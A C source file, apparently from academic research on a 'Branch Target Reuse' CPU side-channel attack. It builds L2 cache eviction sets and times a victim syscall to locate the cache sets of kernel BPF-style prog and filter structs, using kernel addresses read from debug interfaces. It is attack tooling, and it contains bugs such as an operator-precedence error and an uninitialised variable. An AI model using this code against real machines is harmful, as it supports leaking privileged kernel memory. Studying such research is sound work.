/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>
#include <math.h>

#include "../../../common/l2_eviction/evict_l2.h"
#include "common.h"
#include "targets.h"
#include "flush_and_reload.h"

#define BASE_SYSCALL 39
#define VICTIM_SYSCALL_NR 0x250

#define ITERATIONS 50
#define MAX_ITERATIONS 10000

uint64_t l3_threshold = 0;

#if defined(INTEL_10_GEN)


#elif defined(INTEL_13_GEN) || defined(INTEL_14_GEN) || defined(RAPTOR_COVE)

    #define L3_THRESHOLD_ADDITION 15

#elif defined(LION_COVE)

    #define L3_THRESHOLD_ADDITION 25

#else
    #error "Not supported target"
    // silence other errors
    #define L3_THRESHOLD_ADDITION           0

#endif

static uint64_t measure_syscall(int syscall_nr)
{
    uint64_t t0 = rdtscp();
    asm volatile(
        "syscall\n"
        : "=a" (syscall_nr)
        : "a" (syscall_nr)
        : "r11", "rcx"
    );
    return rdtscp()-t0;
}

static void do_syscall(int syscall_nr)
{
    asm volatile(
        "syscall\n"
        : "=a" (syscall_nr)
        : "a" (syscall_nr)
        : "r11", "rcx"
    );
}

static int compare(const void *x, const void *y)
{
    return (*(uint64_t *)x - *(uint64_t *)y);
}

static void sort_ascending(uint64_t x[], unsigned n)
{
    qsort(x, n, sizeof(uint64_t), compare);
}


static void link_ev_set(void ** ev_set, int ev_set_size) {

    void **next;
	for (int i = 0; i < ev_set_size; i++) {
		next = ev_set[i];
		*next = ev_set[(i + 1) % ev_set_size];
	}

}

static void allocate_pool(uint8_t * page_2mb[8]) {
    int max_per_page = HUGE_PAGE_SIZE / L2_SETS / 64;
    int n_pages = ceil(L2_EVICT_SIZE / (double) max_per_page);

    for (int i = 0; i < n_pages; i++)
    {
        page_2mb[i] = allocate_huge_page();
    }

}

static void init_ev_set_l2(uint64_t l2_offset, uint8_t * page_2mb[8], void ** ev_set) {
    int max_per_page = HUGE_PAGE_SIZE / L2_SETS / 64;
    int page_idx = -1;

    assert((l2_offset & ~((64 * L2_SETS) - 1)) == 0);

    for (int i = 0; i < L2_EVICT_SIZE; i++)
    {
        if (i % max_per_page == 0) {
            page_idx += 1;
        }

        uint8_t * addr = page_2mb[page_idx] + l2_offset + (i%max_per_page * L2_SETS * 64);
        assert(addr < (page_2mb[page_idx] + (1 << 21)));
        ev_set[i] = addr;
    }

    link_ev_set(ev_set, L2_EVICT_SIZE);

}


static uint8_t do_evict_and_time(struct config * cfg, int iterations, void ** ev_set_1, void ** ev_set_2, int do_print, uint64_t * med_time_res) {
    uint64_t q1_time, q3_time, med_time, min, max;
    uint64_t times[MAX_ITERATIONS];
    assert(iterations <= MAX_ITERATIONS);

    for(int i=0; i<iterations; i++) {

        asm volatile("mfence\n");
        do_syscall(VICTIM_SYSCALL_NR);
        cpuid();

        if (cfg->debug_evict) {
            read_uint64_from_fd(cfg->fd_evict);
        } else {
            if(ev_set_1) {
                evict(ev_set_1);
                evict(ev_set_1);
                asm volatile("lfence\n");
            }
            if(ev_set_2) {
                evict(ev_set_2);
                evict(ev_set_2);
                asm volatile("lfence\n");
            }
        }

        if (cfg->l3_debug_timing == 0) {
            do_syscall(BASE_SYSCALL);
            do_syscall(BASE_SYSCALL);
            cpuid();
        }

        if (cfg->l3_debug_timing) {
            times[i] = read_uint64_from_fd(cfg->fd_time_prog);
        } else {
            times[i] = measure_syscall(VICTIM_SYSCALL_NR);
        }
    }

    sort_ascending(times, ITERATIONS);

    med_time = times[ITERATIONS/2];

    if (med_time_res) {
        *med_time_res = med_time;
    }

    if (do_print) {

        q1_time = times[ITERATIONS/4];
        q3_time = times[ITERATIONS*3/4];
        min = times[0];
        max = times[ITERATIONS-1];

        printf(" %3lu | %3lu | %3lu | %3lu | %3lu\n", min, q1_time, med_time, q3_time, max);
    }

    uint64_t threshold = cfg->l3_debug_timing ? 50 : l3_threshold; // 225

    if(med_time < threshold) {
        return 1;
    }

    return 0;

}


void find_l2_set_for_prog_struct(struct config * cfg, uint64_t target, void ** ev_set_prog, void ** ev_set_filter) {
    uint8_t * ptr_filter_struct;
    uint8_t * ptr_prog_struct;
    pthread_t tid;
    uint64_t t;
    uint64_t is_fast;
    size_t med_time, med_time_max;
    void *status;
    void * cur_ev_set[L2_EVICT_SIZE];
    uint8_t found_ev_set = 0;
    uint8_t * page_2mb[8];

    printf("=================== Finding L2 SET ====================\n");

    allocate_pool(page_2mb);

    uint64_t page_offset = target & 0xfff;

    ptr_prog_struct = (uint8_t *) read_uint64_from_fd(cfg->fd_get_prog_struct);
    ptr_filter_struct = (uint8_t *) read_uint64_from_fd(cfg->fd_get_filter_struct);


    printf("Prog struct  : %p\n", ptr_prog_struct);
    printf("Filter struct: %p\n", ptr_filter_struct);

    // in case of 2048 sets:
    // 2048 * 64 == 131072 == 2 ** 17
    for (size_t i = 0; i < 5; i++) {
        printf("    CACHED ");
        do_evict_and_time(cfg, 1000, NULL, NULL, 1, &med_time);
    }

    l3_threshold = med_time + L3_THRESHOLD_ADDITION;
    printf("Threshold: %lu\n", l3_threshold);


    for (uint64_t l2_color = 0; l2_color < (L2_SETS / 64); l2_color++) {
        uint64_t l2_offset = l2_color << 12 + page_offset;

        init_ev_set_l2(l2_offset, page_2mb, cur_ev_set);
        cfg->l3_debug_timing = 0;

        is_fast = do_evict_and_time(cfg, 1000, cur_ev_set, NULL, 0, &med_time);

        if (med_time > med_time_max) { med_time_max = med_time;};

        if (!is_fast) {
            printf("[+] l2 offset: %5lx", l2_offset);
            do_evict_and_time(cfg, 1000, cur_ev_set, NULL, 1, NULL);

            if (found_ev_set) {
                printf("Error: found two eviction sets. Try again\n");
                exit(0);
            }

            memcpy(ev_set_prog, cur_ev_set, sizeof(cur_ev_set));
            found_ev_set = 1;
        }
        // else {
            // printf("[+] l2 offset: %5lx TIME: %ld\n", l2_offset, med_time);
        // }

        if (!is_fast) {
            cfg->l3_debug_timing = 1;
            printf("       Kernel evict   ");
            do_evict_and_time(cfg, 1000, cur_ev_set, NULL, 1, NULL);
        }
    }

    if (!found_ev_set) {
        printf("Error: did found an prog eviction set. Try again. Max med_time: %lu\n", med_time_max);
        exit(0);
    }

    cfg->l3_debug_timing = 0;

    // find l2 set for filter ptr
    build_ev_set_l2((uint64_t) ptr_filter_struct, ev_set_filter);
    printf("    CACHED ");
    do_evict_and_time(cfg, 1000, NULL, NULL, 1, NULL);
    printf("EVICT PROG ");
    do_evict_and_time(cfg, 1000, ev_set_prog, NULL, 1, NULL);
    printf("EVICT FILT ");
    do_evict_and_time(cfg, 1000, NULL, ev_set_filter, 1, NULL);
    printf("EVICT BOTH ");
    do_evict_and_time(cfg, 1000, ev_set_prog, ev_set_filter, 1, NULL);
}
